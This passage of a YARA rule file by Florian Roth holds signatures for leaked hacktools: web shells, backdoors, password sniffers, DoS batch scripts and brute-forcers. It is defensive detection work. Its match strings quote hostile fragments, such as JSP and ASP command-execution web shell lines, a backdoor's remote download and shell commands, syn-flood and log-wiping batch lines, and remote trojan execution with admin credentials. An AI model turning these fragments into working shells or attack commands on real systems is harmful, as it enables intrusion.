		$s12 = "lionking" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_JoHor_Posts_Killer {
	meta:
		description = "Disclosed hacktool set - file JoHor_Posts_Killer.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d157f9a76f9d72dba020887d7b861a05f2e56b6a"
	strings:
		$s0 = "Multithreading Posts_Send Killer" fullword ascii
		$s3 = "GET [Access Point] HTTP/1.1" fullword ascii
		$s6 = "The program's need files was not exist!" fullword ascii
		$s7 = "JoHor_Posts_Killer" fullword wide
		$s8 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
		$s10 = "  ( /s ) :" fullword ascii
		$s11 = "forms.vbp" fullword ascii
		$s12 = "forms.vcp" fullword ascii
		$s13 = "Software\\FlySky\\E\\Install" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_tesksd {
	meta:
		description = "Disclosed hacktool set - file tesksd.jpg"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb"
	strings:
		$s0 = "name=\"Microsoft.Windows.Common-Controls\" " fullword ascii
		$s1 = "ExeMiniDownload.exe" fullword wide
		$s16 = "POST %Hs" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Http {
	meta:
		description = "Disclosed hacktool set - file Http.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "788bf0fdb2f15e0c628da7056b4e7b1a66340338"
	strings:
		$s0 = "RPCRT4.DLL" fullword ascii
		$s1 = "WNetAddConnection2A" fullword ascii
		$s2 = "NdrPointerBufferSize" fullword ascii
		$s3 = "_controlfp" fullword ascii
	condition:
		all of them and filesize < 10KB
}

rule Hacktools_CN_Burst_Start {
	meta:
		description = "Disclosed hacktool set - file Start.bat - DoS tool"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "75d194d53ccc37a68286d246f2a84af6b070e30c"
	strings:
		$s0 = "for /f \"eol= tokens=1,2 delims= \" %%i in (ip.txt) do (" fullword ascii
		$s1 = "Blast.bat /r 600" fullword ascii
		$s2 = "Blast.bat /l Blast.bat" fullword ascii
		$s3 = "Blast.bat /c 600" fullword ascii
		$s4 = "start Clear.bat" fullword ascii
		$s5 = "del Result.txt" fullword ascii
		$s6 = "s syn %%i %%j 3306 /save" fullword ascii
		$s7 = "start Thecard.bat" fullword ascii
		$s10 = "setlocal enabledelayedexpansion" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_tasksvr {
	meta:
		description = "Disclosed hacktool set - file tasksvr.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a73fc74086c8bb583b1e3dcfd326e7a383007dc0"
	strings:
		$s2 = "Consys21.dll" fullword ascii
		$s4 = "360EntCall.exe" fullword wide
		$s15 = "Beijing1" fullword ascii
	condition:
		all of them
}
rule Hacktools_CN_Burst_Clear {
	meta:
		description = "Disclosed hacktool set - file Clear.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "148c574a4e6e661aeadaf3a4c9eafa92a00b68e4"
	strings:
		$s0 = "del /f /s /q %systemdrive%\\*.log    " fullword ascii
		$s1 = "del /f /s /q %windir%\\*.bak    " fullword ascii
		$s4 = "del /f /s /q %systemdrive%\\*.chk    " fullword ascii
		$s5 = "del /f /s /q %systemdrive%\\*.tmp    " fullword ascii
		$s8 = "del /f /q %userprofile%\\COOKIES s\\*.*    " fullword ascii
		$s9 = "rd /s /q %windir%\\temp & md %windir%\\temp    " fullword ascii
		$s11 = "del /f /s /q %systemdrive%\\recycled\\*.*    " fullword ascii
		$s12 = "del /f /s /q \"%userprofile%\\Local Settings\\Temp\\*.*\"    " fullword ascii
		$s19 = "del /f /s /q \"%userprofile%\\Local Settings\\Tempomalware_rary Internet Files\\*.*\"   " ascii
	condition:
		5 of them
}

rule Hacktools_CN_Burst_Thecard {
	meta:
		description = "Disclosed hacktool set - file Thecard.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "50b01ea0bfa5ded855b19b024d39a3d632bacb4c"
	strings:
		$s0 = "tasklist |find \"Clear.bat\"||start Clear.bat" fullword ascii
		$s1 = "Http://www.coffeewl.com" fullword ascii
		$s2 = "ping -n 2 localhost 1>nul 2>nul" fullword ascii
		$s3 = "for /L %%a in (" fullword ascii
		$s4 = "MODE con: COLS=42 lines=5" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Burst_Blast {
	meta:
		description = "Disclosed hacktool set - file Blast.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "b07702a381fa2eaee40b96ae2443918209674051"
	strings:
		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:" ascii
		$s1 = "@echo off" fullword ascii
	condition:
		all of them
}

rule VUBrute_VUBrute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		hash = "166fa8c5a0ebb216c832ab61bf8872da556576a7"
	strings:
		$s0 = "Text Files (*.txt);;All Files (*)" fullword ascii
		$s1 = "http://ubrute.com" fullword ascii
		$s11 = "IP - %d; Password - %d; Combination - %d" fullword ascii
		$s14 = "error.txt" fullword ascii
	condition:
		all of them
}

rule DK_Brute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "93b7c3a01c41baecfbe42461cb455265f33fbc3d"
	strings:
		$s6 = "get_CrackedCredentials" fullword ascii
		$s13 = "Same port used for two different protocols:" fullword wide
		$s18 = "coded by fLaSh" fullword ascii
		$s19 = "get_grbToolsScaningCracking" fullword ascii
	condition:
		all of them
}

rule VUBrute_config {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "b9f66b9265d2370dab887604921167c11f7d93e9"
	strings:
		$s2 = "Restore=1" fullword ascii
		$s6 = "Thread=" ascii
		$s7 = "Running=1" fullword ascii
		$s8 = "CheckCombination=" fullword ascii
		$s10 = "AutoSave=1.000000" fullword ascii
		$s12 = "TryConnect=" ascii
		$s13 = "Tray=" ascii
	condition:
		all of them
}

rule sig_238_hunt {
	meta:
		description = "Disclosed hacktool set (old stuff) - file hunt.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "f9f059380d95c7f8d26152b1cb361d93492077ca"
	strings:
		$s1 = "Programming by JD Glaser - All Rights Reserved" fullword ascii
		$s3 = "Usage - hunt \\\\servername" fullword ascii
		$s4 = ".share = %S - %S" fullword wide
		$s5 = "SMB share enumerator and admin finder " fullword ascii
		$s7 = "Hunt only runs on Windows NT..." fullword ascii
		$s8 = "User = %S" fullword ascii
		$s9 = "Admin is %s\\%s" fullword ascii
	condition:
		all of them
}

rule sig_238_listip {
	meta:
		description = "Disclosed hacktool set (old stuff) - file listip.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "f32a0c5bf787c10eb494eb3b83d0c7a035e7172b"
	strings:
		$s0 = "ERROR!!! Bad host lookup. Program Terminate." fullword ascii
		$s2 = "ERROR No.2!!! Program Terminate." fullword ascii
		$s4 = "Local Host Name: %s" fullword ascii
		$s5 = "Packed by exe32pack 1.38" fullword ascii
		$s7 = "Local Computer Name: %s" fullword ascii
		$s8 = "Local IP Adress: %s" fullword ascii
	condition:
		all of them
}

rule ArtTrayHookDll {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "4867214a3d96095d14aa8575f0adbb81a9381e6c"
	strings:
		$s0 = "ArtTrayHookDll.dll" fullword ascii
		$s7 = "?TerminateHook@@YAXXZ" fullword ascii
	condition:
		all of them
}

rule sig_238_eee {
	meta:
		description = "Disclosed hacktool set (old stuff) - file eee.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "236916ce2980c359ff1d5001af6dacb99227d9cb"
	strings:
		$s0 = "szj1230@yesky.com" fullword wide
		$s3 = "C:\\Program Files\\DevStudio\\VB\\VB5.OLB" fullword ascii
		$s4 = "MailTo:szj1230@yesky.com" fullword wide
		$s5 = "Command1_Click" fullword ascii
		$s7 = "software\\microsoft\\internet explorer\\typedurls" fullword wide
		$s11 = "vb5chs.dll" fullword ascii
		$s12 = "MSVBVM50.DLL" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_asp4 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp4.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "faf991664fd82a8755feb65334e5130f791baa8c"
	strings:
		$s0 = "system.dll" fullword ascii
		$s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
		$s3 = "Public Function reboot(atype As Variant)" fullword ascii
		$s4 = "t& = ExitWindowsEx(1, atype)" ascii
		$s5 = "atype=request(\"atype\") " fullword ascii
		$s7 = "AceiveX dll" fullword ascii
		$s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
		$s10 = "sys.reboot(atype)" fullword ascii
	condition:
		all of them
}

rule aspfile1 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file aspfile1.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "77b1e3a6e8f67bd6d16b7ace73dca383725ac0af"
	strings:
		$s0 = "' -- check for a command that we have posted -- '" fullword ascii
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
		$s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><BODY>" fullword ascii
		$s6 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
		$s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
		$s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii
	condition:
		3 of them
}

rule EditServer_HackTool {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditServer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "87b29c9121cac6ae780237f7e04ee3bc1a9777d3"
	strings:
		$s0 = "%s Server.exe" fullword ascii
		$s1 = "Service Port: %s" fullword ascii
		$s2 = "The Port Must Been >0 & <65535" fullword ascii
		$s8 = "3--Set Server Port" fullword ascii
		$s9 = "The Server Password Exceeds 32 Characters" fullword ascii
		$s13 = "Service Name: %s" fullword ascii
		$s14 = "Server Password: %s" fullword ascii
		$s17 = "Inject Process Name: %s" fullword ascii

		$x1 = "WinEggDrop Shell Congirator" fullword ascii
	condition:
		5 of ($s*) or $x1
}

rule sig_238_letmein {
	meta:
		description = "Disclosed hacktool set (old stuff) - file letmein.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "74d223a56f97b223a640e4139bb9b94d8faa895d"
	strings:
		$s1 = "Error get globalgroup memebers: NERR_InvalidComputer" fullword ascii
		$s6 = "Error get users from server!" fullword ascii
		$s7 = "get in nt by name and null" fullword ascii
		$s16 = "get something from nt, hold by killusa." fullword ascii
	condition:
		all of them
}

rule sig_238_token {
	meta:
		description = "Disclosed hacktool set (old stuff) - file token.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14"
	strings:
		$s0 = "Logon.exe" fullword ascii
		$s1 = "Domain And User:" fullword ascii
		$s2 = "PID=Get Addr$(): One" fullword ascii
		$s3 = "Process " fullword ascii
		$s4 = "psapi.dllK" fullword ascii
	condition:
		all of them
}

rule sig_238_TELNET {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "50d02d77dc6cc4dc2674f90762a2622e861d79b1"
	strings:
		$s0 = "TELNET [host [port]]" fullword wide
		$s2 = "TELNET.EXE" fullword wide
		$s4 = "Microsoft(R) Windows(R) Millennium Operating System" fullword wide
		$s14 = "Software\\Microsoft\\Telnet" fullword wide
	condition:
		all of them
}

rule snifferport {
	meta:
		description = "Disclosed hacktool set (old stuff) - file snifferport.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d14133b5eaced9b7039048d0767c544419473144"
	strings:
		$s0 = "iphlpapi.DLL" fullword ascii
		$s5 = "ystem\\CurrentCorolSet\\" fullword ascii
		$s11 = "Port.TX" fullword ascii
		$s12 = "32Next" fullword ascii
		$s13 = "V1.2 B" fullword ascii
	condition:
		all of them
}

rule sig_238_webget {
	meta:
		description = "Disclosed hacktool set (old stuff) - file webget.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "36b5a5dee093aa846f906bbecf872a4e66989e42"
	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "GET A HTTP/1.0" fullword ascii
		$s2 = " error " fullword ascii
		$s13 = "Downloa" ascii
	condition:
		all of them
}

rule XYZCmd_zip_Folder_XYZCmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file XYZCmd.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "bbea5a94950b0e8aab4a12ad80e09b630dd98115"
	strings:
		$s0 = "Executes Command Remotely" fullword wide
		$s2 = "XYZCmd.exe" fullword wide
		$s6 = "No Client Software" fullword wide
		$s19 = "XYZCmd V1.0 For NT S" fullword ascii
	condition:
		all of them
}

rule ASPack_Chinese {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPack Chinese.ini"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "02a9394bc2ec385876c4b4f61d72471ac8251a8e"
	strings:
		$s0 = "= Click here if you want to get your registered copy of ASPack" fullword ascii
		$s1 = ";  For beginning of translate - copy english.ini into the yourlanguage.ini" fullword ascii
		$s2 = "E-Mail:                      shinlan@km169.net" fullword ascii
		$s8 = ";  Please, translate text only after simbol '='" fullword ascii
		$s19 = "= Compress with ASPack" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_EDIR {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "03367ad891b1580cfc864e8a03850368cbf3e0bb"
	strings:
		$s1 = "response.write \"<a href='index.asp'>" fullword ascii
		$s3 = "if Request.Cookies(\"password\")=\"" ascii
		$s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
		$s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
		$s19 = "whichdir=Request(\"path\")" fullword ascii
	condition:
		all of them
}

rule sig_238_filespy {
	meta:
		description = "Disclosed hacktool set (old stuff) - file filespy.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 50
		hash = "89d8490039778f8c5f07aa7fd476170293d24d26"
	strings:
		$s0 = "Hit [Enter] to begin command mode..." fullword ascii
		$s1 = "If you are in command mode," fullword ascii
		$s2 = "[/l] lists all the drives the monitor is currently attached to" fullword ascii
		$s9 = "FileSpy.exe" fullword wide
		$s12 = "ERROR starting FileSpy..." fullword ascii
		$s16 = "exe\\filespy.dbg" fullword ascii
		$s17 = "[/d <drive>] detaches monitor from <drive>" fullword ascii
		$s19 = "Should be logging to screen..." fullword ascii
		$s20 = "Filmon:  Unknown log record type" fullword ascii
	condition:
		7 of them
}

rule ByPassFireWall_zip_Folder_Ie {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Ie.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d1b9058f16399e182c9b78314ad18b975d882131"
	strings:
		$s0 = "d:\\documents and settings\\loveengeng\\desktop\\source\\bypass\\lcc\\ie.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s5 = "The procedure entry point %s could not be located in the dynamic link libmalware_rary %s" fullword ascii
		$s7 = "The ordinal %u could not be located in the dynamic link libmalware_rary %s" fullword ascii
	condition:
		all of them
}

rule EditKeyLogReadMe {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "dfa90540b0e58346f4b6ea12e30c1404e15fbe5a"
	strings:
		$s0 = "editKeyLog.exe KeyLog.exe," fullword ascii
		$s1 = "WinEggDrop.DLL" fullword ascii
		$s2 = "nc.exe" fullword ascii
		$s3 = "KeyLog.exe" fullword ascii
		$s4 = "EditKeyLog.exe" fullword ascii
		$s5 = "wineggdrop" fullword ascii
	condition:
		3 of them
}

rule PassSniffer_zip_Folder_readme {
	meta:
		description = "Disclosed hacktool set (old stuff) - file readme.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a52545ae62ddb0ea52905cbb61d895a51bfe9bcd"
	strings:
		$s0 = "PassSniffer.exe" fullword ascii
		$s1 = "POP3/FTP Sniffer" fullword ascii
		$s2 = "Password Sniffer V1.0" fullword ascii
	condition:
		1 of them
}

rule sig_238_gina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.reg"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "324acc52566baf4afdb0f3e4aaf76e42899e0cf6"
	strings:
		$s0 = "\"gina\"=\"gina.dll\"" fullword ascii
		$s1 = "REGEDIT4" fullword ascii
		$s2 = "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]" fullword ascii
	condition:
		all of them
}

rule splitjoin {
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e4a9ef5d417038c4c76b72b5a636769a98bd2f8c"
	strings:
		$s0 = "Not for distribution without the authors permission" fullword wide
		$s2 = "Utility to split and rejoin files.0" fullword wide
		$s5 = "Copyright (c) Angus Johnson 2001-2002" fullword wide
		$s19 = "SplitJoin" fullword wide
	condition:
		all of them
}

rule EditKeyLog {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditKeyLog.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a450c31f13c23426b24624f53873e4fc3777dc6b"
	strings:
		$s1 = "Press Any Ke" fullword ascii
		$s2 = "Enter 1 O" fullword ascii
		$s3 = "Bon >0 & <65535L" fullword ascii
		$s4 = "--Choose " fullword ascii
	condition:
		all of them
}

rule PassSniffer {
	meta:
		description = "Disclosed hacktool set (old stuff) - file PassSniffer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f"
	strings:
		$s2 = "Sniff" fullword ascii
		$s3 = "GetLas" fullword ascii
		$s4 = "VersionExA" fullword ascii
		$s10 = " Only RuntUZ" fullword ascii
		$s12 = "emcpysetprintf\\" fullword ascii
		$s13 = "WSFtartup" fullword ascii
	condition:
		all of them
}

rule aspfile2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "14efbc6cb01b809ad75a535d32b9da4df517ff29"
	strings:
		$s0 = "response.write \"command completed success!\" " fullword ascii
		$s1 = "for each co in foditems " fullword ascii
		$s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
		$s19 = "<title>Hello! Welcome </title>" fullword ascii
	condition:
		all of them
}

rule UnPack_malware_rar_Folder_InjectT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6"
	strings:
		$s0 = "%s -Install                          -->To Install The Service" fullword ascii
		$s1 = "Explorer.exe" fullword ascii
		$s2 = "%s -Start                            -->To Start The Service" fullword ascii
		$s3 = "%s -Stop                             -->To Stop The Service" fullword ascii
		$s4 = "The Port Is Out Of Range" fullword ascii
		$s7 = "Fail To Set The Port" fullword ascii
		$s11 = "\\psapi.dll" fullword ascii
		$s20 = "TInject.Dll" fullword ascii

		$x1 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
		$x2 = "injectt.exe" fullword ascii
	condition:
		( 1 of ($x*) ) and ( 3 of ($s*) )
}

rule Jc_WinEggDrop_Shell {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "820674b59f32f2cf72df50ba4411d7132d863ad2"
	strings:
		$s0 = "Sniffer.dll" fullword ascii
		$s4 = ":Execute net.exe user Administrator pass" fullword ascii
		$s5 = "Fport.exe or mport.exe " fullword ascii
		$s6 = ":Password Sniffering Is Running |Not Running " fullword ascii
		$s9 = ": The Terminal Service Port Has Been Set To NewPort" fullword ascii
		$s15 = ": Del www.exe                   " fullword ascii
		$s20 = ":Dir *.exe                    " fullword ascii
	condition:
		2 of them
}

rule aspbackdoor_asp1 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp1.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9ef9f34392a673c64525fcd56449a9fb1d1f3c50"
	strings:
		$s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
		$s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
		$s6 = "set rs=conn.execute (sql)%> " fullword ascii
		$s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
		$s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
		$s15 = "sql=\"select * from scjh\" " fullword ascii
	condition:
		all of them
}

rule QQ_zip_Folder_QQ {
	meta:
		description = "Disclosed hacktool set (old stuff) - file QQ.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb"
	strings:
		$s0 = "EMAIL:haoq@neusoft.com" fullword wide
		$s1 = "EMAIL:haoq@neusoft.com" fullword wide
		$s4 = "QQ2000b.exe" fullword wide
		$s5 = "haoq@neusoft.com" fullword ascii
		$s9 = "QQ2000b.exe" fullword ascii
		$s10 = "\\qq2000b.exe" fullword ascii
		$s12 = "WINDSHELL STUDIO[WINDSHELL " fullword wide
		$s17 = "SOFTWARE\\HAOQIANG\\" fullword ascii
	condition:
		5 of them
}

rule UnPack_malware_rar_Folder_TBack {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TBack.DLL"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "30fc9b00c093cec54fcbd753f96d0ca9e1b2660f"
	strings:
		$s0 = "Redirect SPort RemoteHost RPort       -->Port Redirector" fullword ascii
		$s1 = "http://IP/a.exe a.exe                 -->Download A File" fullword ascii
		$s2 = "StopSniffer                           -->Stop Pass Sniffer" fullword ascii
		$s3 = "TerminalPort Port                     -->Set New Terminal Port" fullword ascii
		$s4 = "Example: Http://12.12.12.12/a.exe abc.exe" fullword ascii
		$s6 = "Create Password Sniffering Thread Successfully. Status:Logging" fullword ascii
		$s7 = "StartSniffer NIC                      -->Start Sniffer" fullword ascii
		$s8 = "Shell                                 -->Get A Shell" fullword ascii
		$s11 = "DeleteService ServiceName             -->Delete A Service" fullword ascii
		$s12 = "Disconnect ThreadNumber|All           -->Disconnect Others" fullword ascii
		$s13 = "Online                                -->List All Connected IP" fullword ascii
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword ascii
		$s16 = "Example: Set REG_SZ Test Trojan.exe" fullword ascii
		$s18 = "Execute Program                       -->Execute A Program" fullword ascii
		$s19 = "Reboot                                -->Reboot The System" fullword ascii
		$s20 = "Password Sniffering Is Not Running" fullword ascii
	condition:
		4 of them
}

rule sig_238_cmd_2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file cmd.jsp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "be4073188879dacc6665b6532b03db9f87cfc2bb"
	strings:
		$s0 = "Process child = Runtime.getRuntime().exec(" ascii
		$s1 = "InputStream in = child.getInputStream();" fullword ascii
		$s2 = "String cmd = request.getParameter(\"" ascii
		$s3 = "while ((c = in.read()) != -1) {" fullword ascii
		$s4 = "<%@ page import=\"java.io.*\" %>" fullword ascii
	condition:
		all of them
}

rule RangeScan {
	meta:
		description = "Disclosed hacktool set (old stuff) - file RangeScan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "bace2c65ea67ac4725cb24aa9aee7c2bec6465d7"
	strings:
		$s0 = "RangeScan.EXE" fullword wide
		$s4 = "<br><p align=\"center\"><b>RangeScan " fullword ascii
		$s9 = "Produced by isn0" fullword ascii
		$s10 = "RangeScan" fullword wide
		$s20 = "%d-%d-%d %d:%d:%d" fullword ascii
	condition:
		3 of them
}

rule XYZCmd_zip_Folder_Readme {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Readme.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "967cb87090acd000d22e337b8ce4d9bdb7c17f70"
	strings:
		$s3 = "3.xyzcmd \\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe" fullword ascii
		$s20 = "XYZCmd V1.0" fullword ascii
	condition:
		all of them
}

rule ByPassFireWall_zip_Folder_Inject {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Inject.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "34f564301da528ce2b3e5907fd4b1acb7cb70728"
	strings:
		$s6 = "Fail To Inject" fullword ascii
		$s7 = "BtGRemote Pro; V1.5 B/{" fullword ascii
		$s11 = " Successfully" fullword ascii
	condition:
		all of them
}

rule sig_238_sqlcmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcmd.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 40
		hash = "b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a"
	strings:
		$s0 = "Permission denial to EXEC command.:(" fullword ascii
		$s3 = "by Eyas<cooleyas@21cn.com>" fullword ascii
		$s4 = "Connect to %s MSSQL server success.Enjoy the shell.^_^" fullword ascii
		$s5 = "Usage: %s <host> <uid> <pwd>" fullword ascii
		$s6 = "SqlCmd2.exe Inside Edition." fullword ascii
		$s7 = "Http://www.patching.net  2000/12/14" fullword ascii
		$s11 = "Example: %s 192.168.0.1 sa \"\"" fullword ascii
	condition:
		4 of them
}

rule ASPack_ASPACK {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPACK.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "c589e6fd48cfca99d6335e720f516e163f6f3f42"
	strings:
		$s0 = "ASPACK.EXE" fullword wide
		$s5 = "CLOSEDFOLDER" fullword wide
		$s10 = "ASPack compressor" fullword wide
	condition:
		all of them
}

rule sig_238_2323 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file 2323.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21812186a9e92ee7ddc6e91e4ec42991f0143763"
	strings:
		$s0 = "port - Port to listen on, defaults to 2323" fullword ascii
		$s1 = "Usage: srvcmd.exe [/h] [port]" fullword ascii
		$s3 = "Failed to execute shell" fullword ascii
		$s5 = "/h   - Hide Window" fullword ascii
		$s7 = "Accepted connection from client at %s" fullword ascii
		$s9 = "Error %d: %s" fullword ascii
	condition:
		all of them
}

rule Jc_ALL_WinEggDropShell_malware_rar_Folder_Install_2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Install.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "95866e917f699ee74d4735300568640ea1a05afd"
	strings:
		$s1 = "http://go.163.com/sdemo" fullword wide
		$s2 = "Player.tmp" fullword ascii
		$s3 = "Player.EXE" fullword wide
		$s4 = "mailto:sdemo@263.net" fullword ascii
		$s5 = "S-Player.exe" fullword ascii
		$s9 = "http://www.BaiXue.net (" fullword wide
	condition:
		all of them
}

rule sig_238_TFTPD32 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TFTPD32.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8"
	strings:
		$s0 = " http://arm.533.net" fullword ascii
		$s1 = "Tftpd32.hlp" fullword ascii
		$s2 = "Timeouts and Ports should be numerical and can not be 0" fullword ascii
		$s3 = "TFTPD32 -- " fullword wide
		$s4 = "%d -- %s" fullword ascii
		$s5 = "TIMEOUT while waiting for Ack block %d. file <%s>" fullword ascii
		$s12 = "TftpPort" fullword ascii
		$s13 = "Ttftpd32BackGround" fullword ascii
		$s17 = "SOFTWARE\\TFTPD32" fullword ascii
	condition:
		all of them
}

rule sig_238_iecv {
	meta:
		description = "Disclosed hacktool set (old stuff) - file iecv.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "6e6e75350a33f799039e7a024722cde463328b6d"
	strings:
		$s1 = "Edit The Content Of Cookie " fullword wide
		$s3 = "Accessories\\wordpad.exe" fullword ascii
		$s4 = "gorillanation.com" fullword ascii
		$s5 = "Before editing the content of a cookie, you should close all windows of Internet" ascii
		$s12 = "http://nirsoft.cjb.net" fullword ascii
	condition:
		all of them
}

rule Antiy_Ports_1_21 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0"
	strings:
		$s0 = "AntiyPorts.EXE" fullword wide
		$s7 = "AntiyPorts MFC Application" fullword wide
